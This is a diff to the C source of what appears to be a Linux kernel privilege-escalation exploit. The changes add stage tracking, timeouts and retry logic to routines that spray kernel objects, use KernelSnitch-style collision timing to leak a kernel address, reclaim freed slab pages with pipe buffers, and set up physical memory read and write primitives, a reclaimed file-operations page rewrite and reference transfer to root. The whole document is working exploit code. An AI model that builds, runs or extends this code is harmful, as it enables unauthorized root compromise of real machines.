@@ -1,5 +1,7 @@
 #include "common.h"
 
+#include <poll.h>
+
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 #include P0_FINGERPRINT_HEADER
 #endif
@@ -19,6 +21,10 @@ static int pipe_fds_reclaim[PIPE_RECLAIM][2];
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 static int p0_gate_holders[PIPE_RECLAIM][2];
 static int p0_gate_holders_initialized;
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+static int p0_rewrite_pipe_index = -1;
+#endif
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static void close_p0_gate_holders(void) {
@@ -40,7 +46,29 @@ static void close_p0_gate_holders(void) {
 #endif
 #endif
 
+enum pipe_prepare_stage {
+  PIPE_PREPARE_STAGE_IDLE = 0,
+  PIPE_PREPARE_STAGE_CHILD_BEGIN,
+  PIPE_PREPARE_STAGE_PREP_MEMFDS,
+  PIPE_PREPARE_STAGE_SPRAY_MEMFDS,
+  PIPE_PREPARE_STAGE_KSNITCH_SETUP,
+  PIPE_PREPARE_STAGE_COLLISION_LAYOUT,
+  PIPE_PREPARE_STAGE_COLLISION_WAIT,
+  PIPE_PREPARE_STAGE_COLLISIONS_READY,
+  PIPE_PREPARE_STAGE_SKB_RECLAIM,
+  PIPE_PREPARE_STAGE_BRUTEFORCE,
+  PIPE_PREPARE_STAGE_PIPE_ALLOC,
+  PIPE_PREPARE_STAGE_RESULT,
+};
+
+struct pipe_prepare_progress {
+  atomic_int stage;
+  atomic_int index;
+};
+
 pid_t pipe_prepare_child = -1;
+int pipe_prepare_hard_failed;
+static struct pipe_prepare_progress *pipe_prepare_progress;
 uint64_t kmalloc_pipe_cache;
 uint64_t kmalloc_normal_1k_cache;
 uint64_t kmalloc_normal_2k_cache;
@@ -55,6 +83,7 @@ uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
 uintptr_t pipebuf_page_base;
 uintptr_t pipebuf_addr;
 int pipebuf_pipe_idx = -1;
+int p0_pipe_scan_changed_pages = -1;
 char physrw_readback[64];
 char physrw_after_write[64];
 int physrw_read_ok;
@@ -105,39 +134,140 @@ void free_pipe_object(int pipefd[2]) {
   resize_pipe_slots(pipefd, 2);
 }
 
+static size_t pipe_prepare_elapsed_ms(size_t started) {
+  return (gettime_ns() - started) / 1000000ULL;
+}
+
+static void set_pipe_prepare_progress(int stage, int index) {
+  if (!pipe_prepare_progress) {
+    return;
+  }
+  atomic_store_explicit(&pipe_prepare_progress->index, index,
+                        memory_order_relaxed);
+  atomic_store_explicit(&pipe_prepare_progress->stage, stage,
+                        memory_order_release);
+}
+
+#if defined(PIPE_PREPARE_TIMEOUT_MS) && PIPE_PREPARE_TIMEOUT_MS > 0
+static const char *pipe_prepare_stage_name(int stage) {
+  switch (stage) {
+    case PIPE_PREPARE_STAGE_CHILD_BEGIN: return "child-begin";
+    case PIPE_PREPARE_STAGE_PREP_MEMFDS: return "prep-memfds";
+    case PIPE_PREPARE_STAGE_SPRAY_MEMFDS: return "spray-memfds";
+    case PIPE_PREPARE_STAGE_KSNITCH_SETUP: return "kernelsnitch-setup";
+    case PIPE_PREPARE_STAGE_COLLISION_LAYOUT: return "collision-layout";
+    case PIPE_PREPARE_STAGE_COLLISION_WAIT: return "collision-wait";
+    case PIPE_PREPARE_STAGE_COLLISIONS_READY: return "collisions-ready";
+    case PIPE_PREPARE_STAGE_SKB_RECLAIM: return "skb-reclaim";
+    case PIPE_PREPARE_STAGE_BRUTEFORCE: return "bruteforce";
+    case PIPE_PREPARE_STAGE_PIPE_ALLOC: return "pipe-alloc";
+    case PIPE_PREPARE_STAGE_RESULT: return "result";
+    default: return "idle";
+  }
+}
+#endif
+
+static void release_pipe_prepare_progress(void) {
+  if (pipe_prepare_progress) {
+    munmap(pipe_prepare_progress, PAGE_SIZE);
+    pipe_prepare_progress = NULL;
+  }
+}
+
+static void close_pipe_parent_objects(void) {
+  if (!pipe_objects_ready) {
+    return;
+  }
+  for (size_t i = 0; i < PIPE_DRAIN; i++) {
+    if (pipe_fds_drain[i][0] >= 0) close(pipe_fds_drain[i][0]);
+    if (pipe_fds_drain[i][1] >= 0) close(pipe_fds_drain[i][1]);
+    pipe_fds_drain[i][0] = -1;
+    pipe_fds_drain[i][1] = -1;
+  }
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    if (pipe_fds_reclaim[i][0] >= 0) close(pipe_fds_reclaim[i][0]);
+    if (pipe_fds_reclaim[i][1] >= 0) close(pipe_fds_reclaim[i][1]);
+    pipe_fds_reclaim[i][0] = -1;
+    pipe_fds_reclaim[i][1] = -1;
+  }
+  pipe_objects_ready = 0;
+}
+
+int stop_pipe_prepare_child(void) {
+  if (pipe_prepare_child <= 0) {
+    return 1;
+  }
+
+  pid_t child = pipe_prepare_child;
+  if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
+    pr_warning("pipe prepare child kill failed pid=%d errno=%d\n",
+               child, errno);
+  }
+
+  int status = 0;
+  pid_t waited;
+  do {
+    waited = waitpid(child, &status, 0);
+  } while (waited < 0 && errno == EINTR);
+  if (waited == child || (waited < 0 && errno == ECHILD)) {
+    pipe_prepare_child = -1;
+    return 1;
+  }
+  pr_warning("pipe prepare child reap failed pid=%d errno=%d\n",
+             child, errno);
+  pipe_prepare_hard_failed = 1;
+  return 0;
+}
+
 uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx prep;
   struct mm_ctx spray;
   struct mm_ctx pre;
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  size_t started = gettime_ns();
 
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_CHILD_BEGIN, 0);
+  pr_info("pipe prepare stage=begin prep=%zu spray=%zu pre=%zu post=%zu\n",
+          prep.mm_cnt, spray.mm_cnt, pre.mm_cnt, post.mm_cnt);
 
   for (size_t i = 0; i < prep.mm_cnt; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_PREP_MEMFDS, (int)i);
     prep.childs[i] = -1;
     prep.memfds[i] = clone_memfd();
   }
   for (size_t i = 0; i < spray.mm_cnt; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_SPRAY_MEMFDS, (int)i);
     spray.childs[i] = -1;
     spray.memfds[i] = clone_memfd();
   }
+  pr_info("pipe prepare stage=baseline-memfds elapsed_ms=%zu\n",
+          pipe_prepare_elapsed_ms(started));
 
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_KSNITCH_SETUP, 0);
   setup_kernelsnitch();
+  pr_info("pipe prepare stage=kernelsnitch-ready elapsed_ms=%zu\n",
+          pipe_prepare_elapsed_ms(started));
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_COLLISION_LAYOUT, (int)i);
     pre.childs[i] = -1;
     pre.memfds[i] = clone_memfd();
   }
   pid_t leak_child = clone_leak_child();
   for (size_t i = 0; i < post.mm_cnt; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_COLLISION_LAYOUT,
+                              (int)(pre.mm_cnt + i));
     post.childs[i] = -1;
     post.memfds[i] = clone_memfd();
   }
   int leak_memfd = open_memfd(leak_child);
+  pr_info("pipe prepare stage=collision-layout leak_pid=%d elapsed_ms=%zu\n",
+          leak_child, pipe_prepare_elapsed_ms(started));
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
@@ -148,12 +278,19 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   for (size_t i = 0; i < spray.mm_cnt; i++) {
     kill_child(spray.childs[i]);
   }
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_COLLISION_WAIT, leak_child);
+  pr_info("pipe prepare stage=collision-wait leak_pid=%d elapsed_ms=%zu\n",
+          leak_child, pipe_prepare_elapsed_ms(started));
   SYSCHK(waitpid(leak_child, NULL, 0));
 
   if (!kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
   }
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_COLLISIONS_READY, 0);
+  pr_info("pipe prepare stage=collisions-ready elapsed_ms=%zu\n",
+          pipe_prepare_elapsed_ms(started));
 
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_SKB_RECLAIM, 0);
   unsigned char *buf = malloc(SKB_SEND_SIZE);
   memset(buf, 0x50, SKB_SEND_SIZE);
 
@@ -201,6 +338,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_BRUTEFORCE, 0);
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
@@ -227,6 +365,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 #endif
 
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_PIPE_ALLOC, (int)i);
     alloc_pipe_object(pipe_fds_drain[i]);
   }
 
@@ -234,6 +373,8 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(skb_sv[0]));
   SYSCHK(close(skb_sv[1]));
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_PIPE_ALLOC,
+                              (int)(PIPE_DRAIN + i));
     alloc_pipe_object(pipe_fds_reclaim[i]);
   }
 
@@ -246,10 +387,34 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   free_ctx_storage(&pre);
   free_ctx_storage(&post);
   free(buf);
+  set_pipe_prepare_progress(PIPE_PREPARE_STAGE_RESULT, 0);
+  pr_info("pipe prepare stage=reclaim-ready base=%016zx elapsed_ms=%zu\n",
+          base, pipe_prepare_elapsed_ms(started));
   return base;
 }
 
 uintptr_t prepare_pipe_buffer_page(void) {
+  if (pipe_prepare_hard_failed) {
+    pr_warning("pipe prepare refused after hard failure\n");
+    return 0;
+  }
+#if defined(PIPE_PREPARE_TIMEOUT_MS) && PIPE_PREPARE_TIMEOUT_MS > 0
+  if (pipe_prepare_child > 0) {
+    pr_warning("pipe prepare refused while child=%d is still active\n",
+               pipe_prepare_child);
+    pipe_prepare_hard_failed = 1;
+    return 0;
+  }
+#endif
+  release_pipe_prepare_progress();
+  pipe_prepare_progress = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+  if (pipe_prepare_progress == MAP_FAILED) {
+    pipe_prepare_progress = NULL;
+    pr_error("pipe prepare progress mmap failed errno=%d\n", errno);
+  }
+  atomic_init(&pipe_prepare_progress->stage, PIPE_PREPARE_STAGE_IDLE);
+  atomic_init(&pipe_prepare_progress->index, 0);
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     make_pipe_object(pipe_fds_drain[i]);
   }
@@ -263,6 +428,7 @@ uintptr_t prepare_pipe_buffer_page(void) {
   pid_t child = SYSCHK(fork());
   if (child == 0) {
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    signal(SIGPIPE, SIG_IGN);
     if (getppid() == 1) {
       _exit(1);
     }
@@ -274,7 +440,14 @@ uintptr_t prepare_pipe_buffer_page(void) {
       pipe_fds_drain[i][0] = -1;
       pipe_fds_drain[i][1] = -1;
     }
-    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
+    set_pipe_prepare_progress(PIPE_PREPARE_STAGE_RESULT, 1);
+    ssize_t wrote;
+    do {
+      wrote = write(result_pipe[1], &base, sizeof(base));
+    } while (wrote < 0 && errno == EINTR);
+    if (wrote != (ssize_t)sizeof(base)) {
+      _exit(1);
+    }
     for (;;) {
       sleep(60);
     }
@@ -283,12 +456,61 @@ uintptr_t prepare_pipe_buffer_page(void) {
   pipe_prepare_child = child;
   SYSCHK(close(result_pipe[1]));
   uintptr_t base = 0;
-  ssize_t got = read(result_pipe[0], &base, sizeof(base));
+#if defined(PIPE_PREPARE_TIMEOUT_MS) && PIPE_PREPARE_TIMEOUT_MS > 0
+  struct pollfd result_poll = {
+    .fd = result_pipe[0],
+    .events = POLLIN | POLLHUP,
+  };
+  int ready;
+  size_t wait_deadline = gettime_ns() +
+      (size_t)PIPE_PREPARE_TIMEOUT_MS * 1000000ULL;
+  pr_info("pipe prepare parent stage=wait child=%d timeout_ms=%d\n",
+          child, PIPE_PREPARE_TIMEOUT_MS);
+  for (;;) {
+    size_t now = gettime_ns();
+    if (now >= wait_deadline) {
+      ready = 0;
+      break;
+    }
+    size_t remaining_ns = wait_deadline - now;
+    int remaining_ms = (int)((remaining_ns + 999999ULL) / 1000000ULL);
+    ready = poll(&result_poll, 1, remaining_ms);
+    if (ready >= 0 || errno != EINTR) {
+      break;
+    }
+  }
+  if (ready <= 0) {
+    int progress_stage = atomic_load_explicit(
+        &pipe_prepare_progress->stage, memory_order_acquire);
+    int progress_index = atomic_load_explicit(
+        &pipe_prepare_progress->index, memory_order_relaxed);
+    pipe_prepare_hard_failed = 1;
+    pr_warning("pipe prepare parent stage=%s child=%d progress=%s/%d "
+               "errno=%d\n",
+               ready == 0 ? "timeout" : "poll-error", child,
+               pipe_prepare_stage_name(progress_stage), progress_index,
+               ready == 0 ? ETIMEDOUT : errno);
+    close(result_pipe[0]);
+    close_pipe_parent_objects();
+    int reaped = stop_pipe_prepare_child();
+    pr_warning("pipe prepare parent hard-failure child=%d reaped=%d\n",
+               child, reaped);
+    release_pipe_prepare_progress();
+    return 0;
+  }
+#endif
+  ssize_t got;
+  do {
+    got = read(result_pipe[0], &base, sizeof(base));
+  } while (got < 0 && errno == EINTR);
   SYSCHK(close(result_pipe[0]));
   if (got != (ssize_t)sizeof(base)) {
     pr_warning("pipe page child did not report base\n");
     base = 0;
   }
+  pr_info("pipe prepare parent stage=result child=%d got=%zd base=%016zx\n",
+          child, got, base);
+  release_pipe_prepare_progress();
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     close(pipe_fds_drain[i][0]);
     close(pipe_fds_drain[i][1]);
@@ -300,22 +522,11 @@ uintptr_t prepare_pipe_buffer_page(void) {
 
 void reset_pipe_attempt(void) {
   if (pipe_prepare_child > 0) {
-    kill(pipe_prepare_child, SIGKILL);
-    waitpid(pipe_prepare_child, NULL, 0);
-    pipe_prepare_child = -1;
+    stop_pipe_prepare_child();
   }
 
-  if (pipe_objects_ready) {
-    for (size_t i = 0; i < PIPE_DRAIN; i++) {
-      close(pipe_fds_drain[i][0]);
-      close(pipe_fds_drain[i][1]);
-    }
-    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-      close(pipe_fds_reclaim[i][0]);
-      close(pipe_fds_reclaim[i][1]);
-    }
-    pipe_objects_ready = 0;
-  }
+  close_pipe_parent_objects();
+  release_pipe_prepare_progress();
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -575,8 +786,8 @@ int pipe_phys_read(
   if (patch != (ssize_t)sizeof(pb)) {
     int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                   (ssize_t)sizeof(saved);
-    pr_error("pipe read buffer patch failed ret=%zd restore=%d\n",
-             patch, restore);
+    pr_warning("pipe read buffer patch failed ret=%zd restore=%d\n",
+               patch, restore);
     return 0;
   }
 
@@ -589,8 +800,8 @@ int pipe_phys_read(
       memcmp(&restored, &saved, sizeof(saved)) == 0;
   int ok = got == (ssize_t)len && restored_ok;
   if (!ok) {
-    pr_error("pipe read failed got=%zd want=%zu restore=%d\n",
-             got, len, restored_ok);
+    pr_warning("pipe read failed got=%zd want=%zu restore=%d\n",
+               got, len, restored_ok);
   }
   return ok;
 }
@@ -624,8 +835,8 @@ int pipe_phys_write(
   if (patch != (ssize_t)sizeof(pb)) {
     int restore = kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
                   (ssize_t)sizeof(saved);
-    pr_error("pipe write buffer patch failed ret=%zd restore=%d\n",
-             patch, restore);
+    pr_warning("pipe write buffer patch failed ret=%zd restore=%d\n",
+               patch, restore);
     return 0;
   }
 
@@ -638,8 +849,8 @@ int pipe_phys_write(
       memcmp(&restored, &saved, sizeof(saved)) == 0;
   int ok = wrote == (ssize_t)len && restored_ok;
   if (!ok) {
-    pr_error("pipe write failed wrote=%zd want=%zu restore=%d\n",
-             wrote, len, restored_ok);
+    pr_warning("pipe write failed wrote=%zd want=%zu restore=%d\n",
+               wrote, len, restored_ok);
   }
   return ok;
 }
@@ -773,15 +984,15 @@ int install_pipe_physrw(int fd) {
   char seed[] = PHYS_READ_TAG;
   if (kernel_read_data(fd, proof_addr, saved_proof, sizeof(saved_proof)) !=
       (ssize_t)sizeof(saved_proof)) {
-    pr_error("phys proof old read failed addr=%016zx size=%zu\n",
-             proof_addr, sizeof(saved_proof));
+    pr_warning("phys proof old read failed addr=%016zx size=%zu\n",
+               proof_addr, sizeof(saved_proof));
     goto cleanup;
   }
   proof_saved = 1;
   if (kernel_read_data(fd, proof64_addr, &saved_proof64,
                        sizeof(saved_proof64)) !=
       (ssize_t)sizeof(saved_proof64)) {
-    pr_error("phys proof64 old read failed addr=%016zx\n", proof64_addr);
+    pr_warning("phys proof64 old read failed addr=%016zx\n", proof64_addr);
     goto cleanup;
   }
   proof64_saved = 1;
@@ -1009,11 +1220,18 @@ static void spawn_p0_ref_keeper(int retained_pipe_index) {
       pause();
     }
   }
+  useconds_t retry_delay = 10000;
   for (;;) {
     if (transfer_p0_references_to_root(retained_pipe_index)) {
       _exit(0);
     }
-    usleep(10000);
+    usleep(retry_delay);
+    if (retry_delay < 1000000) {
+      retry_delay *= 2;
+      if (retry_delay > 1000000) {
+        retry_delay = 1000000;
+      }
+    }
   }
 }
 
@@ -1042,6 +1260,10 @@ int prepare_p0_pipe_oracle(void) {
     p0_gate_holders[pipe_index][1] = -1;
   }
   p0_gate_holders_initialized = 1;
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  p0_rewrite_pipe_index = -1;
+#endif
 
   pipebuf_page_base = prepare_pipe_buffer_page();
   if (!is_direct_ptr(pipebuf_page_base)) {
@@ -1079,6 +1301,20 @@ int expand_p0_pipe_oracle(void) {
   return 1;
 }
 
+static int p0_pipe_marker_matches(const unsigned char *page, size_t size) {
+  static const char prefix[] = "RMG-P0-PIPE";
+  if (size < sizeof(prefix) - 1 ||
+      memcmp(page, prefix, sizeof(prefix) - 1) != 0) {
+    return 0;
+  }
+  for (size_t offset = sizeof(prefix) - 1; offset < size; offset++) {
+    if (page[offset] != 0x5a) {
+      return 0;
+    }
+  }
+  return 1;
+}
+
 int verify_p0_pipe_oracle_gate(void) {
   unsigned char page[PAGE_SIZE];
   int gate_hits = 0;
@@ -1093,12 +1329,12 @@ int verify_p0_pipe_oracle_gate(void) {
       pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
                  pipe_index, errno);
       spawn_p0_ref_keeper(-1);
-      return 0;
+      return -1;
     }
     if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                         sizeof(page))) {
       spawn_p0_ref_keeper(-1);
-      return 0;
+      return -1;
     }
     size_t gate_offset = PAGE_SIZE;
     for (size_t offset = 0; offset + 18 <= PAGE_SIZE; offset++) {
@@ -1112,7 +1348,7 @@ int verify_p0_pipe_oracle_gate(void) {
       gate_pipe_index = (int)pipe_index;
       pr_info("p0 gate marker pipe=%zu offset=%zu\n",
               pipe_index, gate_offset);
-    } else if (memcmp(page, "RMG-P0-PIPE", 11) != 0) {
+    } else if (!p0_pipe_marker_matches(page, sizeof(page))) {
       changed_pages++;
       uint64_t words[8];
       memcpy(words, page, sizeof(words));
@@ -1138,11 +1374,30 @@ int verify_p0_pipe_oracle_gate(void) {
     if (!pipe_write_full(pipe_fds_reclaim[pipe_index][1], marker,
                          sizeof(marker))) {
       spawn_p0_ref_keeper(-1);
-      return 0;
+      return -1;
     }
   }
   pr_info("p0 pipe gate hits=%d changed=%d\n",
           gate_hits, changed_pages);
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  if (gate_hits == 1 && changed_pages == 0 &&
+      app_fops_page_reuse_enabled()) {
+    unsigned char merge_seed[APP_REUSED_FOPS_PAGE_PRESERVE];
+    memset(merge_seed, 0xa5, sizeof(merge_seed));
+    if (!pipe_write_full(pipe_fds_reclaim[gate_pipe_index][1],
+                         merge_seed, sizeof(merge_seed))) {
+      pr_warning("p0 payload rewrite seed failed pipe=%d errno=%d\n",
+                 gate_pipe_index, errno);
+      spawn_p0_ref_keeper(-1);
+      return -1;
+    }
+    p0_rewrite_pipe_index = gate_pipe_index;
+    pipebuf_pipe_idx = gate_pipe_index;
+    pr_info("p0 payload rewrite seed ready pipe=%d slot=2 bytes=%zu\n",
+            gate_pipe_index, sizeof(merge_seed));
+  }
+#endif
   if (gate_hits != 0 || changed_pages != 0) {
     spawn_p0_ref_keeper(
         gate_hits == 1 && changed_pages == 0 ? gate_pipe_index : -1);
@@ -1157,6 +1412,53 @@ int verify_p0_pipe_oracle_gate(void) {
     return 0;
   }
   return -1;
+}
+
+int rewrite_p0_payload_page(const void *data, size_t size) {
+#if defined(APP_FOPS_REWRITE_RECLAIMED_PAGE) && \
+    APP_FOPS_REWRITE_RECLAIMED_PAGE
+  if (!data || size != PAGE_SIZE || p0_rewrite_pipe_index < 0 ||
+      APP_REUSED_FOPS_PAGE_PRESERVE < 18 ||
+      APP_REUSED_FOPS_PAGE_PRESERVE >= size) {
+    return 0;
+  }
+  const unsigned char *bytes = data;
+  if (!pipe_write_full(pipe_fds_reclaim[p0_rewrite_pipe_index][1],
+                       bytes + APP_REUSED_FOPS_PAGE_PRESERVE,
+                       size - APP_REUSED_FOPS_PAGE_PRESERVE)) {
+    pr_warning("p0 payload rewrite write failed pipe=%d errno=%d\n",
+               p0_rewrite_pipe_index, errno);
+    return 0;
+  }
+
+  int snapshot[2] = {-1, -1};
+  unsigned char observed[PAGE_SIZE];
+  int duplicated = pipe_duplicate_bytes(
+      p0_gate_holders[p0_rewrite_pipe_index][0], snapshot, PAGE_SIZE, 1);
+  int read_ok = duplicated && pipe_read_full(snapshot[0], observed, PAGE_SIZE);
+  int prefix_ok = read_ok &&
+      memcmp(observed, "RMG-P0-ORACLE-GATE", 18) == 0;
+  int verified = prefix_ok &&
+      memcmp(observed + APP_REUSED_FOPS_PAGE_PRESERVE,
+             bytes + APP_REUSED_FOPS_PAGE_PRESERVE,
+             size - APP_REUSED_FOPS_PAGE_PRESERVE) == 0;
+  if (snapshot[0] >= 0) {
+    close(snapshot[0]);
+  }
+  if (snapshot[1] >= 0) {
+    close(snapshot[1]);
+  }
+  pr_info("p0 payload rewrite pipe=%d wrote=%zu duplicate=%d read=%d "
+          "prefix=%d verified=%d\n",
+          p0_rewrite_pipe_index,
+          size - APP_REUSED_FOPS_PAGE_PRESERVE, duplicated, read_ok,
+          prefix_ok, verified);
+  return verified;
+#else
+  (void)data;
+  (void)size;
+  return 0;
+#endif
 }
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -1241,19 +1543,50 @@ uintptr_t scan_p0_pipe_oracle(void) {
   int best_score = -1;
   int second_score = -1;
   int changed_pages = 0;
+#if defined(APP_P0_NONDESTRUCTIVE_PROBE_SCAN) && \
+    APP_P0_NONDESTRUCTIVE_PROBE_SCAN
+  int scan_holder[2] = {-1, -1};
+#endif
+  p0_pipe_scan_changed_pages = -1;
+#if defined(APP_P0_NONDESTRUCTIVE_PROBE_SCAN) && \
+    APP_P0_NONDESTRUCTIVE_PROBE_SCAN
+  if (pipe2(scan_holder, O_CLOEXEC) != 0 ||
+      fcntl(scan_holder[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
+    pr_warning("p0 scan holder setup failed errno=%d\n", errno);
+    if (scan_holder[0] >= 0) close(scan_holder[0]);
+    if (scan_holder[1] >= 0) close(scan_holder[1]);
+    return (uintptr_t)-1;
+  }
+#endif
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   int best_significant = 0;
 #endif
 
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     memset(page, 0, sizeof(page));
+#if defined(APP_P0_NONDESTRUCTIVE_PROBE_SCAN) && \
+    APP_P0_NONDESTRUCTIVE_PROBE_SCAN
+    errno = 0;
+    ssize_t duplicated = syscall(
+        SYS_tee, pipe_fds_reclaim[pipe_index][0], scan_holder[1],
+        scan_size, SPLICE_F_NONBLOCK);
+    if (duplicated != (ssize_t)scan_size ||
+        !pipe_read_full(scan_holder[0], page, scan_size)) {
+      pr_warning("p0 scan snapshot failed pipe=%zu tee=%zd size=%zu errno=%d\n",
+                 pipe_index, duplicated, scan_size, errno);
+      close(scan_holder[0]);
+      close(scan_holder[1]);
+      return (uintptr_t)-1;
+    }
+#else
     if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                         scan_size)) {
       pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
                  pipe_index, scan_size, errno);
       return (uintptr_t)-1;
     }
-    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
+#endif
+    if (p0_pipe_marker_matches(page, scan_size)) {
       continue;
     }
 
@@ -1299,6 +1632,13 @@ uintptr_t scan_p0_pipe_oracle(void) {
             pipe_index, best_score, second_score, best_slide);
 #endif
   }
+
+#if defined(APP_P0_NONDESTRUCTIVE_PROBE_SCAN) && \
+    APP_P0_NONDESTRUCTIVE_PROBE_SCAN
+  close(scan_holder[0]);
+  close(scan_holder[1]);
+#endif
+  p0_pipe_scan_changed_pages = changed_pages;
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   pr_info("p0 fingerprint changed=%d best=%d second=%d "
